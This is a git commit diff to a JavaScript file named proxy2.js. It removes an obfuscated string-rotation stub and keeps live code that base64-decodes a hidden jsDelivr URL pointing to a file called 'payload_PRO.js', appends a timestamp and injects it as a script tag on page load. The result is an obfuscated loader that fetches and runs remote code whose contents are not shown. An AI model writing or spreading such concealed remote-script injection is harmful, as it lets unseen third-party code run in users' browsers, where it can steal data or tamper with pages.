18006f3750b62f4ad28ef2bc52cc6fdce0fdaba1
huihoangadm <hoanghuygvp8527@gmail.com>
2025-11-20 22:31:30 +0700

    proxy2.js

--- proxy2.js
+++ proxy2.js
@@ -1,8 +1,3 @@
-(function(_0x4553bd,_0x249f60){const _0x18776c=_0x4553bd();while(!![]){try{const _0x2d85b7=parseInt(_0x18776c[0])/0x1*(parseInt(_0x18776c[1])/0x2)+parseInt(_0x18776c[2])/0x3+ -parseInt(_0x18776c[3])/0x4+parseInt(_0x18776c[4])/0x5+parseInt(_0x18776c[5])/0x6*(parseInt(_0x18776c[6])/0x7)+ -parseInt(_0x18776c[7])/0x8+ -parseInt(_0x18776c[8])/0x9;if(_0x2d85b7===_0x249f60)break;else _0x4553bd['push'](_0x4553bd['shift']());}catch(_0x2c6552){_0x4553bd['push'](_0x4553bd['shift']());}}}(
-function(){return['2129634','474212','777601','596004','542413','138','1360920','488','910'];},
-0xddb7b
-));
-
 (function(){
     const urls = [
         "aHR0cHM6Ly9jZG4uanNkZWxpdmIubmV0L2doL2h1aWhvYW5nYWRtL25hei1hdXRvLXZpcC9wYXlsb2FkX1BSTy5qcz91PQ==",
@@ -10,9 +5,9 @@ function(){return['2129634','474212','777601','596004','542413','138','1360920',
     ];
 
     urls.forEach(u=>{
-        let s=document.createElement("script");
-        s.src = atob(u) + Date.now();
+        let link = atob(u) + Date.now();
+        let s = document.createElement("script");
+        s.src = link;
         document.body.appendChild(s);
     });
-
 })();
